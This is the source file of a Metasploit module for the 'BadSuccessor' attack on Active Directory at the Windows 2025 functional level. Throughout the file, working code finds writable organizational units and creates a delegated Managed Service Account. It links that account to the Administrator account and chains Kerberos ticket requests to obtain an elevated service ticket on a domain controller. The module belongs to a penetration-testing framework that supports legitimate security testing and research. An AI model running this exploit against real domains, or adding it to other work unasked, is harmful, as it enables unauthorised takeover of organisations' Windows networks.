##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Rex::Proto::LDAP
  include Msf::OptionalSession::LDAP
  include Msf::Exploit::Remote::LDAP::ActiveDirectory

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BadSuccessor: dMSA abuse to Escalate Privileges in Windows Active Directory',
        'Description' => %q{
          This module exploits 'Bad Successor', which allows operators to elevate privileges on domain controllers
          running at the Windows 2025 forest functional level. Microsoft decided to introduce Delegated Managed Service
          Accounts in this forest level and they came ripe for exploitation.

          Normal users can't create dMSA accounts where dMSA accounts are supposed to be created, the Managed Service
          Accounts OU, but if a normal user has write access to any other OU they can then create a dMSA account in
          said OU. After creating the account the user can edit LDAP attributes of the account to indicate that this
          account should inherit privileges from the Administrator user. Once this is complete we can request kerberos
          tickets on behalf of the dMSA account and voila, you're admin.

          The module has two actions, one for creating the dMSA account and setting it up to impersonate a high
          privilege user, and another action for requesting the kerberos tickets needed to use the dMSA account for privilege
          escalation.
        },
        'Author' => [
          'AngelBoy', # discovery
          'Spencer McIntyre', # Help with Kerberos implementation and a number of improvements during review
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?&vid=badsuccessor-demo-video'],
          [ 'URL', 'https://specterops.io/blog/2025/05/27/understanding-mitigating-badsuccessor/'],
          [ 'URL', 'https://jorgequestforknowledge.wordpress.com/2025/09/02/from-badsuccessor-to-patchedsuccessor/'],
        ],
        'License' => MSF_LICENSE,
        'Privileged' => true,
        'DisclosureDate' => '2025-05-21',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'AKA' => [ 'BadSuccessor' ]
        },
        'Actions' => [
          [ 'CREATE_DMSA', { 'Description' => 'Create a dMSA account which impersonates a high privilege user' } ],
          [ 'GET_TICKET', { 'Description' => 'Requests a series of tickets to give the user a ticket which can be used in the context of whomst the dMSA account impersonates' } ],
        ],
        'DefaultAction' => 'CREATE_DMSA'
      )
    )
    register_options([
      OptString.new('DMSA_ACCOUNT_NAME', [true, 'The name of the dMSA account to be create or request tickets for']),
      OptString.new('ACCOUNT_TO_IMPERSONATE', [true, 'The name of the dMSA account to be created', 'Administrator'], conditions: %w[ACTION == CREATE_DMSA]),
      OptString.new('RHOSTNAME', [true, 'The hostname of the domain controller'], conditions: %w[ACTION == GET_TICKET]),
      OptString.new('SERVICE', [true, 'The Service you wish to get a high privilege ticket for', 'cifs'], conditions: %w[ACTION == GET_TICKET]),
    ])
    deregister_options('SESSION')
  end

  def windows_version_vulnerable?
    domain_info = adds_get_domain_info(@ldap)
    version = domain_info[:domain_behavior_version]

    unless version.to_i == 10
      print_error('This module only works against domains running at the Windows 2025 functional level.')
      return false
    end
    print_good('The domain is running at the Windows 2025 functional level, which is vulnerable to BadSuccessor.')
    true
  end

  def validate
    errors = {}

    case action.name
    when 'GET_TICKET'
      if %w[auto ntlm].include?(datastore['LDAP::Auth']) && Net::NTLM.is_ntlm_hash?(datastore['LDAPPassword'].encode(::Encoding::UTF_16LE))
        errors['LDAPPassword'] = 'The GET_TICKET action is incompatible with LDAP passwords that are NTLM hashes.'
      end
    end

    raise Msf::OptionValidateError, errors unless errors.empty?
  end

  def check
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      return Exploit::CheckCode::Safe unless windows_version_vulnerable?

      ous = get_ous_we_can_write_to
      if ous.blank?
        return Exploit::CheckCode::Safe("Failed to find any Organizational Units #{datastore['LDAPUsername']} can write to.")
      end

      print_good("Found #{ous.length} OUs we can write to, listing below:")
      ous.each do |ou|
        print_good(" - #{ou}")
      end

      Exploit::CheckCode::Appears
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def get_ous_we_can_write_to
    organizational_units = []

    filter = '(objectClass=organizationalUnit)'
    attributes = ['distinguishedName', 'name', 'objectClass', 'nTSecurityDescriptor']
    entries = query_ldap_server(filter, attributes)
    entries.each do |entry|
      if adds_obj_grants_permissions?(@ldap, entry, SecurityDescriptorMatcher::Allow.any(%i[WP]))
        organizational_units << entry[:dn].first
      end
    end
    organizational_units
  end

  def query_ldap_server(raw_filter, attributes, base_prefix: nil)
    if base_prefix.blank?
      full_base_dn = @base_dn.to_s
    else
      full_base_dn = "#{base_prefix},#{@base_dn}"
    end
    begin
      filter = Net::LDAP::Filter.construct(raw_filter)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Could not compile the filter! Error was #{e}")
    end

    # Set the value of LDAP_SERVER_SD_FLAGS_OID flag so everything but
    # the SACL flag is set, as we need administrative privileges to retrieve
    # the SACL from the ntSecurityDescriptor attribute on Windows AD LDAP servers.

    all_but_sacl_flag = OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION
    control_values = [all_but_sacl_flag].map(&:to_ber).to_ber_sequence.to_s.to_ber
    controls = []
    controls << [LDAP_SERVER_SD_FLAGS_OID.to_ber, true.to_ber, control_values].to_ber_sequence
    returned_entries = @ldap.search(base: full_base_dn, filter: filter, attributes: attributes, controls: controls)
    query_result_table = @ldap.get_operation_result.table
    validate_query_result!(query_result_table, filter)
    returned_entries
  end

  def create_dmsa(account_name, writeable_dn, group_membership)
    sam_account_name = account_name
    sam_account_name += '$' unless sam_account_name.ends_with?('$')
    dn = "CN=#{account_name},#{writeable_dn}"
    print_status("Attempting to create dMSA account CN: #{account_name}, DN: #{dn}")

    dmsa_attributes = {
      'objectclass' => ['top', 'person', 'organizationalPerson', 'user', 'computer', 'msDS-DelegatedManagedServiceAccount'],
      'cn' => [account_name],
      'useraccountcontrol' => ['4096'],
      'samaccountname' => [sam_account_name],
      'dnshostname' => ["#{Faker::Name.first_name}.#{domain_dns_name}"],
      'msds-supportedencryptiontypes' => ['28'],
      'msds-managedpasswordinterval' => ['30'],
      'msds-groupmsamembership' => [group_membership],
      'msds-delegatedmsastate' => ['0'],
      'name' => [account_name]
    }

    unless @ldap.add(dn: dn, attributes: dmsa_attributes)

      res = @ldap.get_operation_result

      case res.code
      when Net::LDAP::ResultCodeInsufficientAccessRights
        fail_with(Failure::BadConfig, 'Insufficient access to create dMSA seed')
      when Net::LDAP::ResultCodeEntryAlreadyExists
        fail_with(Failure::BadConfig, "Seed object #{account_name} already exists")
      when Net::LDAP::ResultCodeConstraintViolation
        fail_with(Failure::UnexpectedReply, "Constraint violation: #{res.error_message}")
      else
        fail_with(Failure::UnexpectedReply, "#{res.message}: #{res.error_message}")
      end

      return false
    end

    print_good("Created dMSA #{account_name}")
    true
  end

  def set_dmsa_attributes(dn, delegated_state, preceded_by_link)
    print_status("Setting attributes for dMSA object: #{dn}")

    # Define the attributes to update
    operations = [
      [:replace, 'msds-delegatedmsastate', [delegated_state]],
      [:replace, 'msds-managedaccountprecededbylink', [preceded_by_link]]
    ]

    # Perform the LDAP modify operation
    unless @ldap.modify(dn: dn, operations: operations)
      res = @ldap.get_operation_result
      fail_with(Failure::Unknown, "Failed to update attributes for #{dn}: #{res.message} - #{res.error_message}")
    end

    print_good("Successfully updated attributes for dMSA object: #{dn}")
  end

  def query_account(account_name)
    account_name += '$' unless account_name.ends_with?('$')
    entry = adds_get_object_by_samaccountname(@ldap, account_name)

    if entry.nil?
      print_error('Original object not found')
      exit
    end

    attrs_to_copy = {}
    entry.each do |attr, values|
      next unless %w[msds-managedaccountprecededbylink msds-delegatedmsastate].include?(attr.to_s)

      attrs_to_copy[attr.to_s] = values.map(&:to_s)
    end

    attrs_to_copy.each do |key, value|
      if value.is_a?(Array)
        if value.length == 1
          print_status("#{key} => #{value.first.inspect}")
        else
          print_status("#{key} => [#{value.map(&:inspect).join(', ')}]")
        end
      end
    end
  end

  def get_group_memebership(sid)
    sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.from_sddl_text(
      "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;#{sid})",
      domain_sid: sid.rpartition('-').first
    )
    sd
  end

  def domain_dns_name
    return @domain_dns_name if @domain_dns_name

    if @ldap
      @domain_dns_name = adds_get_domain_info(@ldap)[:dns_name]
    else
      ldap_connect { |ldap| @domain_dns_name = adds_get_domain_info(ldap)[:dns_name] }
    end

    @domain_dns_name
  end

  def action_create_dmsa
    ldap_connect do |ldap|
      validate_bind_success!(ldap)
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          fail_with(Failure::NotFound, "Couldn't discover base DN!")
        end
      end

      @ldap = ldap
      currrent_user_info = adds_get_current_user(@ldap)
      sid = Rex::Proto::MsDtyp::MsDtypSid.read(currrent_user_info[:objectsid].first)

      # Get vulnerable OUs
      ous = get_ous_we_can_write_to
      print_good("Found #{ous.length} OUs we can write to, listing them below:")
      ous.each do |ou|
        print_good(" - #{ou}")
      end

      writeable_dn = ous.sample

      create_dmsa(datastore['DMSA_ACCOUNT_NAME'], writeable_dn, get_group_memebership(sid).to_binary_s)
      fail_with(Failure::NoTarget, 'There are no Organization Units we can write to, the exploit can not continue') if ous.empty?
      set_dmsa_attributes("CN=#{datastore['DMSA_ACCOUNT_NAME']},#{writeable_dn}", '2', "CN=#{datastore['ACCOUNT_TO_IMPERSONATE']},CN=Users,#{@base_dn}")
      query_account(datastore['DMSA_ACCOUNT_NAME'])
    end
  end

  def run_get_ticket_module(mod, opts = {})
    opts.each do |key, value|
      option_name = key.to_s

      if value == :unset
        mod.datastore.unset(option_name)
      else
        mod.datastore[option_name] = value
      end
    end

    result = mod.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output
    )

    # Exceptions raised in the get_ticket won't propagate here, so fail if the credential is nil
    fail_with(Failure::Unknown, 'Failed to run get_ticket module.') unless result

    result[:credential]
  end

  def action_get_ticket
    mod_refname = 'admin/kerberos/get_ticket'

    print_status("Loading #{mod_refname}")
    get_ticket_module = framework.modules.create(mod_refname)

    unless get_ticket_module
      print_error("Failed to load module: #{mod_refname}")
      return
    end

    # First get a TGT for the attacker who created the dmsa account:
    user_tgt = auth_via_kdc
    print_good("Obtained TGT for the user #{datastore['LDAPUsername']}")

    # Secondly get a TGT for dMSA impersonating the target account:
    impersonate = datastore['DMSA_ACCOUNT_NAME']
    impersonate += '$' unless impersonate.ends_with?('$')
    get_dmsa_tgs_options = {
      'DOMAIN' => domain_dns_name,
      'PASSWORD' => datastore['LDAPPassword'],
      'rhosts' => datastore['RHOST'],
      'username' => datastore['LDAPUsername'],
      'SPN' => "krbtgt/#{domain_dns_name}",
      'action' => 'get_tgs',
      'IMPERSONATE' => impersonate,
      'IMPERSONATE_TYPE' => 'dmsa',
      'krb5ccname' => user_tgt[:path]
    }

    dmsa_credential = run_get_ticket_module(get_ticket_module, get_dmsa_tgs_options)
    print_good("Obtained TGT for dMSA #{datastore['DMSA_ACCOUNT_NAME']}")

    temp_ccache_file = Tempfile.create(['bad_successor_', '.ccache'], binmode: true)
    begin
      temp_ccache_file.write(dmsa_credential.to_ccache.encode)
      temp_ccache_file.close

      # Lastly request the ticket for the desired service:
      get_priv_esc_tgs_options = {
        'username' => impersonate,
        'SPN' => "#{datastore['SERVICE']}/#{datastore['RHOSTNAME']}.#{domain_dns_name}",
        'action' => 'get_tgs',
        'krb5ccname' => temp_ccache_file.path,
        'PASSWORD' => :unset,
        'IMPERSONATE' => :unset,
        'IMPERSONATE_TYPE' => 'none'
      }

      run_get_ticket_module(get_ticket_module, get_priv_esc_tgs_options)
    ensure
      File.unlink(temp_ccache_file.path) if temp_ccache_file && File.exist?(temp_ccache_file.path)
    end

    print_good("Obtained elevated TGT for #{datastore['DMSA_ACCOUNT_NAME']}")
  end

  def init_authenticator(options = {})
    options.merge!({
      host: rhost,
      realm: domain_dns_name,
      username: datastore['LDAPUsername'],
      password: datastore['LDAPPassword'],
      framework: framework,
      framework_module: self
    })

    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
  end

  def auth_via_kdc
    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
    authenticator.authenticate_via_kdc(options)
  end

  def run
    send("action_#{action.name.downcase}")
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end
end
